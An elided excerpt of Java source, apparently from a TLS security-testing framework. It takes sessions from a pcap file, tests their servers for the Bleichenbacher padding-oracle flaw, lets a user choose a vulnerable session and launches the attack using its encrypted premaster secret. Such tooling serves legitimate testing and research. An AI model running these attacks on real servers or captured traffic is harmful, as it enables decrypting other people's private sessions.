...
public class BleichenbacherPcapFileHandler implements PcapFileHandler {
    ...
    public void handlePcapFile() {
        PcapAnalyzer pcapAnalyzer =
                new PcapAnalyzer(bleichenbacherCommandConfig.getPcapFileLocation());
        List<PcapSession> sessions = pcapAnalyzer.getAllSessions();

        if (!sessions.isEmpty()) {
            ServerSelection bleichenbacherServerSelection =
    ...
    private void processServerOverride(
        ...
        Attacker<? extends TLSDelegateConfig> attacker =
                new BleichenbacherAttacker(
                        bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        ...
        if (Objects.equals(result, Boolean.TRUE)) {
            ...
            if (!vulnerablePcapSessions.isEmpty()) {
                ...
                PcapSession selectedSession =
                        consoleInteractor.getUserSelectedSession(vulnerablePcapSessions);
    ...
    private void processPcapServers(
        ...
        if ("N".equals(userOption)) {
            ...
            checkVulnerabilityOfAllServersAndDisplay(
                    hosts, bleichenbacherCommandConfig, serverSessionsMap, consoleInteractor);
        } else {
            ...
            if (Objects.equals(vulnerability, Boolean.TRUE)) {
                ...
                selectSessionAndExecuteAttack(
                        serverSessionsMap, host, bleichenbacherCommandConfig, consoleInteractor);
            } else {
    ...
    private void checkVulnerabilityOfAllServersAndDisplay(
        ...
        List<String> vulnerableServers =
                getVulnerableServers(uniqueServers, bleichenbacherCommandConfig);
    ...
    private List<String> getVulnerableServers(
            List<String> uniqueServers, BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        ...
        for (String server : uniqueServers) {
            ...
            Attacker<? extends TLSDelegateConfig> attacker =
                    new BleichenbacherAttacker(
                            bleichenbacherCommandConfig,
                            bleichenbacherCommandConfig.createConfig());
    ...
    private void selectSessionAndExecuteAttack(
            Map<String, List<PcapSession>> serverSessionsMap,
            String host,
            BleichenbacherCommandConfig bleichenbacherCommandConfig,
            ConsoleInteractor consoleInteractor) {
        ...
        if (selectedSession != null) {
            executeAttack(
                    selectedSession,
                    selectedSession.getDestinationHost(),
                    bleichenbacherCommandConfig);
        }
    }
    ...
    private void executeAttack(
        ...
        LOGGER.info(
                "host="
                        + bleichenbacherCommandConfig.getClientDelegate().getHost()
                        + " and encryptedPremasterSecret="
                        + bleichenbacherCommandConfig.getEncryptedPremasterSecret());
